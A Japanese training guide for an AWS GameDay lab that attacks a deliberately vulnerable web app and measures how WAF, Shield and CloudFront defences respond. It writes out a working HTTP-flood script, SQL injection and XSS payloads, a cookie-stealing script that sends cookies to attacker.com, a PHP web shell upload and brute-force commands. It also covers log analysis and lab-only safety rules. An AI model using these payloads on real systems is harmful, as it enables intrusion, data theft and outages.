# 攻撃シミュレーションガイド

このガイドでは、AWS GameDay DDoS環境で実行可能な各種攻撃シミュレーションの詳細な手順と期待される結果を説明します。

## 攻撃シミュレーション環境の概要

### 攻撃対象
- **脆弱なWebアプリケーション**: 意図的に複数の脆弱性を含むNode.js/Expressアプリケーション
- **インフラストラクチャ**: AWS上にデプロイされたALB、EC2、WAF、CloudFrontなど

### 攻撃実行環境
- **攻撃シミュレーションインスタンス**: 各種攻撃ツールがプリインストールされたEC2インスタンス
- **利用可能ツール**: curl, Apache Bench, Python攻撃スクリプト, sqlmap, nmap

## 1. DDoS攻撃シミュレーション

### 1.1 基本的なHTTPフラッド攻撃

#### 目的
大量のHTTPリクエストを送信してサーバーリソースを枯渇させる攻撃をシミュレートします。

#### 実行手順

##### 攻撃インスタンスへの接続
```bash
# 攻撃シミュレーションインスタンスにSSH接続
ssh -i your-key.pem ec2-user@<attack-instance-ip>
```

##### 基本的なHTTPフラッド攻撃
```bash
# シンプルなHTTPフラッド攻撃
./ddos_simulation.sh <target-url> <concurrent-requests> <duration>

# 例: 100並行リクエストを60秒間
./ddos_simulation.sh http://<alb-dns-name> 100 60
```

##### 攻撃スクリプトの内容
```bash
#!/bin/bash
# ddos_simulation.sh

TARGET_URL="$1"
CONCURRENT_REQUESTS="$2"
DURATION="$3"

echo "=== DDoS Attack Simulation ==="
echo "Target: $TARGET_URL"
echo "Concurrent Requests: $CONCURRENT_REQUESTS"
echo "Duration: $DURATION seconds"
echo "Starting attack at $(date)"

# Apache Benchを使用した負荷生成
ab -n $((CONCURRENT_REQUESTS * DURATION)) -c $CONCURRENT_REQUESTS $TARGET_URL &

# curlを使用した継続的リクエスト
for i in $(seq 1 $DURATION); do
    for j in $(seq 1 $CONCURRENT_REQUESTS); do
        curl -s --max-time 5 $TARGET_URL > /dev/null 2>&1 &
    done
    sleep 1
    echo "Attack progress: $i/$DURATION seconds"
done

wait
echo "Attack completed at $(date)"
```

#### 期待される結果

##### レベル1（無防備状態）
- **レスポンス時間**: 正常時の10-50倍に増加
- **エラー率**: 50-90%のリクエストがタイムアウトまたは5xx エラー
- **サーバー状態**: CPU使用率90%以上、メモリ使用率急増
- **ユーザー体験**: Webサイトが実質的に利用不可能

```bash
# 攻撃効果の確認
curl -w "Response Time: %{time_total}s\nHTTP Code: %{http_code}\n" http://<alb-dns-name>/

# 期待される出力例:
# Response Time: 15.234s
# HTTP Code: 504
```

##### レベル2（WAF基本保護）
- **レスポンス時間**: 正常時の3-10倍に増加
- **エラー率**: 20-40%のリクエストが429 Too Many Requests
- **保護効果**: レートベースルールによる部分的な軽減
- **ユーザー体験**: 遅延はあるが一部のリクエストは成功

##### レベル3（Shield Advanced）
- **レスポンス時間**: 正常時の1.5-3倍に増加
- **エラー率**: 10-20%のリクエストがブロック
- **保護効果**: 自動DDoS軽減による大幅な改善
- **ユーザー体験**: 軽微な遅延のみ

##### レベル4（CloudFront完全保護）
- **レスポンス時間**: 正常時とほぼ同等またはより高速
- **エラー率**: 5%未満
- **保護効果**: エッジキャッシュによる完全な軽減
- **ユーザー体験**: 攻撃の影響をほとんど感じない

### 1.2 高度なDDoS攻撃パターン

#### Slowloris攻撃
```bash
# Slowloris攻撃のシミュレーション
python3 advanced_ddos_simulation.py \
  --target <target-url> \
  --attack-type slowloris \
  --connections 200 \
  --duration 300

# 期待される結果: 接続プールの枯渇
```

#### HTTP POST フラッド攻撃
```bash
# POST データを使用した攻撃
python3 advanced_ddos_simulation.py \
  --target <target-url> \
  --attack-type post-flood \
  --threads 50 \
  --duration 120 \
  --payload-size 1024

# 期待される結果: アプリケーション処理能力の限界テスト
```

#### 分散攻撃パターン
```bash
# 複数の攻撃パターンを同時実行
./ddos_simulation.sh http://<target-url> 30 60 &
python3 advanced_ddos_simulation.py --target <target-url> --attack-type slowloris --connections 100 --duration 60 &
python3 advanced_ddos_simulation.py --target <target-url> --attack-type post-flood --threads 20 --duration 60 &
wait

# 期待される結果: より現実的な攻撃パターンの再現
```

## 2. Webアプリケーション脆弱性攻撃

### 2.1 SQLインジェクション攻撃

#### 目的
データベースクエリの脆弱性を悪用してデータベースにアクセスする攻撃をシミュレートします。

#### 基本的なSQLインジェクション

##### 認証バイパス攻撃
```bash
# ログイン画面での認証バイパス
curl -X POST "http://<target-url>/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1-- &password=anything"

# より高度なペイロード
curl -X POST "http://<target-url>/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=' UNION SELECT 'admin', 'password' FROM users-- "
```

##### データ抽出攻撃
```bash
# ユーザー情報の抽出
curl -X POST "http://<target-url>/search" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=' UNION SELECT username, password FROM users-- "

# データベース構造の調査
curl -X POST "http://<target-url>/search" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=' UNION SELECT name, sql FROM sqlite_master WHERE type='table'-- "
```

#### 自動化されたSQLインジェクション攻撃
```bash
# Python スクリプトを使用した自動攻撃
python3 sql_injection_test.py --target <target-url> --verbose

# sqlmapを使用した高度な攻撃
sqlmap -u "http://<target-url>/search?query=test" \
  --dbs \
  --batch \
  --level 3 \
  --risk 2
```

#### 期待される結果

##### レベル1（無防備状態）
- **認証バイパス**: 100%成功
- **データ抽出**: 全ユーザー情報の取得可能
- **データベース構造**: 完全な情報取得可能
- **影響**: 機密データの完全な漏洩

##### レベル2以降（WAF保護）
- **認証バイパス**: 基本的なペイロードは70-90%ブロック
- **データ抽出**: 高度なペイロードの一部は成功
- **エラーメッセージ**: 403 Forbidden（WAFブロック）
- **影響**: 攻撃の大部分は軽減されるが、完全ではない

### 2.2 クロスサイトスクリプティング（XSS）攻撃

#### 目的
Webアプリケーションの入力検証の不備を悪用してスクリプトを実行する攻撃をシミュレートします。

#### 反射型XSS攻撃

##### 基本的なXSSペイロード
```bash
# 検索機能でのXSS攻撃
curl "http://<target-url>/search?q=<script>alert('XSS')</script>"

# より巧妙なペイロード
curl "http://<target-url>/search?q=<img src=x onerror=alert('XSS')>"

# イベントハンドラーを使用したペイロード
curl "http://<target-url>/search?q=<svg onload=alert('XSS')>"
```

##### 自動化されたXSS攻撃
```bash
# Python スクリプトを使用した攻撃
python3 xss_test.py --target <target-url> --payloads-file xss_payloads.txt

# 複数のエンドポイントでのテスト
python3 xss_test.py --target <target-url> --endpoints /search,/comment,/profile
```

#### 格納型XSS攻撃

##### コメント機能での攻撃
```bash
# コメント投稿でのXSS
curl -X POST "http://<target-url>/comment" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comment=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>&name=Attacker"

# より持続的なペイロード
curl -X POST "http://<target-url>/comment" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comment=<iframe src=javascript:alert('Persistent XSS')></iframe>&name=Attacker"
```

#### 期待される結果

##### レベル1（無防備状態）
- **スクリプト実行**: 100%成功
- **Cookie窃取**: 可能
- **セッションハイジャック**: 可能
- **影響**: ユーザーアカウントの完全な乗っ取り

##### レベル2以降（WAF保護）
- **基本的なペイロード**: 80-95%ブロック
- **高度なペイロード**: 一部は成功する可能性
- **エラーメッセージ**: 403 Forbidden
- **影響**: 攻撃の大部分は軽減

### 2.3 ファイルアップロード攻撃

#### 目的
ファイルアップロード機能の検証不備を悪用して悪意のあるファイルを実行する攻撃をシミュレートします。

#### 悪意のあるファイルアップロード

##### PHPシェルのアップロード
```bash
# 悪意のあるPHPファイルの作成
echo '<?php system($_GET["cmd"]); ?>' > malicious.php

# ファイルのアップロード
curl -X POST "http://<target-url>/upload" \
  -F "file=@malicious.php" \
  -H "Content-Type: multipart/form-data"

# アップロードされたファイルの実行テスト
curl "http://<target-url>/uploads/malicious.php?cmd=whoami"
```

##### 拡張子偽装攻撃
```bash
# 拡張子を偽装したファイル
echo '<?php system($_GET["cmd"]); ?>' > image.jpg.php

# Content-Typeを偽装
curl -X POST "http://<target-url>/upload" \
  -F "file=@image.jpg.php;type=image/jpeg" \
  -H "Content-Type: multipart/form-data"
```

##### 自動化されたファイルアップロード攻撃
```bash
# Python スクリプトを使用した攻撃
python3 file_upload_test.py --target <target-url> --payloads-dir ./malicious_files/

# 複数のファイルタイプでのテスト
python3 file_upload_test.py --target <target-url> --file-types php,jsp,asp,exe
```

#### 期待される結果

##### レベル1（無防備状態）
- **ファイルアップロード**: 100%成功
- **コード実行**: 可能
- **サーバー制御**: 部分的に可能
- **影響**: サーバーの完全な侵害

##### レベル2以降（WAF保護）
- **悪意のあるファイル**: 60-80%ブロック
- **拡張子チェック**: 一部は回避される可能性
- **実行防止**: アプリケーションレベルでの制限
- **影響**: 攻撃の成功率は大幅に低下

### 2.4 認証・認可攻撃

#### 目的
弱い認証メカニズムや認可の不備を悪用する攻撃をシミュレートします。

#### ブルートフォース攻撃

##### パスワード総当たり攻撃
```bash
# 一般的なパスワードでの攻撃
python3 auth_bypass_test.py --target <target-url> --username admin --wordlist common_passwords.txt

# ユーザー名とパスワードの組み合わせ攻撃
python3 auth_bypass_test.py --target <target-url> --userlist users.txt --passlist passwords.txt
```

#### セッション攻撃

##### セッション固定攻撃
```bash
# セッションIDの固定化
curl -c cookies.txt "http://<target-url>/login"
curl -b cookies.txt -X POST "http://<target-url>/login" \
  -d "username=victim&password=password"

# 固定されたセッションでのアクセス
curl -b cookies.txt "http://<target-url>/admin"
```

##### セッションハイジャック
```bash
# 弱いセッション管理の悪用
python3 session_hijack_test.py --target <target-url> --session-id-pattern "SESSIONID=%d"
```

#### 期待される結果

##### レベル1（無防備状態）
- **ブルートフォース**: 成功（レート制限なし）
- **セッション攻撃**: 成功（弱いセッション管理）
- **権限昇格**: 可能
- **影響**: 管理者権限の取得

##### レベル2以降（WAF保護）
- **ブルートフォース**: レート制限により大幅に制限
- **セッション攻撃**: 一部は軽減
- **ログ記録**: 攻撃の詳細な記録
- **影響**: 攻撃の検知と軽減

## 3. 攻撃効果の測定と分析

### 3.1 パフォーマンス測定

#### レスポンス時間の測定
```bash
# 攻撃前のベースライン測定
for i in {1..10}; do
  curl -w "Time: %{time_total}s\n" -s <target-url> > /dev/null
done

# 攻撃中のレスポンス時間測定
while true; do
  curl -w "$(date): %{time_total}s - %{http_code}\n" -s <target-url> > /dev/null
  sleep 1
done
```

#### スループット測定
```bash
# Apache Benchを使用したスループット測定
ab -n 1000 -c 10 <target-url>

# 攻撃中のスループット変化
ab -n 100 -c 5 -t 60 <target-url>
```

### 3.2 ログ分析

#### アクセスログの分析
```bash
# ALBアクセスログの確認
aws s3 cp s3://<log-bucket>/AWSLogs/<account-id>/elasticloadbalancing/<region>/ . --recursive

# 攻撃パターンの分析
grep "POST /login" *.log | grep "admin" | wc -l
```

#### WAFログの分析
```bash
# WAFブロックログの確認
aws logs filter-log-events \
  --log-group-name "/aws/wafv2/gameday" \
  --filter-pattern "{ $.action = \"BLOCK\" }" \
  --start-time $(date -d '1 hour ago' +%s)000

# 攻撃タイプ別の統計
aws logs filter-log-events \
  --log-group-name "/aws/wafv2/gameday" \
  --filter-pattern "{ $.terminatingRuleId = \"AWSManagedRulesCommonRuleSet*\" }" \
  --start-time $(date -d '1 hour ago' +%s)000
```

### 3.3 CloudWatchメトリクスの確認

#### リアルタイム監視
```bash
# ALBメトリクスの確認
aws cloudwatch get-metric-statistics \
  --namespace AWS/ApplicationELB \
  --metric-name RequestCount \
  --dimensions Name=LoadBalancer,Value=<alb-name> \
  --start-time $(date -d '10 minutes ago' -u +%Y-%m-%dT%H:%M:%S) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
  --period 60 \
  --statistics Sum

# エラー率の確認
aws cloudwatch get-metric-statistics \
  --namespace AWS/ApplicationELB \
  --metric-name HTTPCode_Target_5XX_Count \
  --dimensions Name=LoadBalancer,Value=<alb-name> \
  --start-time $(date -d '10 minutes ago' -u +%Y-%m-%dT%H:%M:%S) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
  --period 60 \
  --statistics Sum
```

## 4. 攻撃シナリオの組み合わせ

### 4.1 複合攻撃シナリオ

#### シナリオ1: 偵察→脆弱性悪用→DDoS攻撃
```bash
# 1. 偵察フェーズ
nmap -sV <target-ip>
python3 vulnerability_scanner.py --target <target-url>

# 2. 脆弱性悪用フェーズ
python3 sql_injection_test.py --target <target-url>
python3 xss_test.py --target <target-url>

# 3. DDoS攻撃フェーズ
./ddos_simulation.sh <target-url> 100 300
```

#### シナリオ2: 分散協調攻撃
```bash
# 複数の攻撃を同時実行
python3 sql_injection_test.py --target <target-url> --continuous &
python3 xss_test.py --target <target-url> --continuous &
./ddos_simulation.sh <target-url> 50 180 &
python3 file_upload_test.py --target <target-url> --continuous &
wait
```

### 4.2 時系列攻撃パターン

#### 段階的エスカレーション攻撃
```bash
#!/bin/bash
# escalation_attack.sh

echo "Phase 1: Reconnaissance (30 seconds)"
nmap -sV <target-ip> &
sleep 30

echo "Phase 2: Vulnerability Probing (60 seconds)"
python3 vulnerability_scanner.py --target <target-url> &
sleep 60

echo "Phase 3: Exploitation (120 seconds)"
python3 sql_injection_test.py --target <target-url> &
python3 xss_test.py --target <target-url> &
sleep 120

echo "Phase 4: DDoS Attack (300 seconds)"
./ddos_simulation.sh <target-url> 100 300

echo "Attack sequence completed"
```

## 5. 攻撃結果の評価基準

### 5.1 成功指標

#### DDoS攻撃
- **完全成功**: レスポンス時間が10倍以上増加、エラー率50%以上
- **部分成功**: レスポンス時間が3-10倍増加、エラー率10-50%
- **軽微な影響**: レスポンス時間が2-3倍増加、エラー率5-10%
- **無効**: レスポンス時間の変化なし、エラー率5%未満

#### 脆弱性攻撃
- **完全成功**: 意図した動作（データ取得、コード実行など）が100%成功
- **部分成功**: 一部のペイロードが成功（30-70%）
- **軽微な成功**: 少数のペイロードが成功（5-30%）
- **無効**: 全てのペイロードがブロック（5%未満）

### 5.2 防御効果の評価

#### 各セキュリティレベルでの期待される防御率

| 攻撃タイプ | レベル1 | レベル2 | レベル3 | レベル4 |
|------------|---------|---------|---------|---------|
| HTTP Flood DDoS | 0% | 30% | 70% | 90% |
| Slowloris DDoS | 0% | 20% | 60% | 85% |
| SQL Injection | 0% | 70% | 80% | 85% |
| XSS | 0% | 60% | 70% | 75% |
| File Upload | 0% | 40% | 50% | 60% |
| Brute Force | 0% | 80% | 85% | 90% |

### 5.3 学習目標の達成度評価

#### 理解度チェックポイント
1. **攻撃手法の理解**: 各攻撃がどのように動作するかを説明できる
2. **影響の評価**: 攻撃が与える影響を定量的に測定できる
3. **防御策の効果**: 各AWSサービスの防御効果を比較できる
4. **ログ分析**: 攻撃の痕跡をログから特定できる
5. **対策の提案**: 追加の防御策を提案できる

## 6. 安全な攻撃実行のためのガイドライン

### 6.1 攻撃実行時の注意事項

#### 環境の隔離
- 攻撃は専用の学習環境でのみ実行
- 本番環境や他人の環境への攻撃は厳禁
- VPC内での隔離された環境での実行

#### リソース制限
- 攻撃の強度は学習目的に適した範囲に制限
- 過度な負荷によるAWSアカウントの制限を避ける
- コスト管理のための攻撃時間の制限

#### データ保護
- 実際の機密データは使用しない
- テスト用のダミーデータのみ使用
- 攻撃後のデータの完全削除

### 6.2 トラブルシューティング

#### 攻撃が動作しない場合
```bash
# ネットワーク接続の確認
ping <target-ip>
telnet <target-ip> 80

# セキュリティグループの確認
aws ec2 describe-security-groups --group-ids <sg-id>

# 攻撃ツールの確認
curl --version
ab -V
python3 --version
```

#### 期待される結果が得られない場合
```bash
# ログの詳細確認
tail -f /var/log/attack_simulation.log

# メトリクスの確認
aws cloudwatch get-metric-statistics --help

# WAF設定の確認
aws wafv2 get-web-acl --scope REGIONAL --id <web-acl-id>
```

このガイドに従って攻撃シミュレーションを実行することで、実際のセキュリティインシデントに対する理解と対応能力を向上させることができます。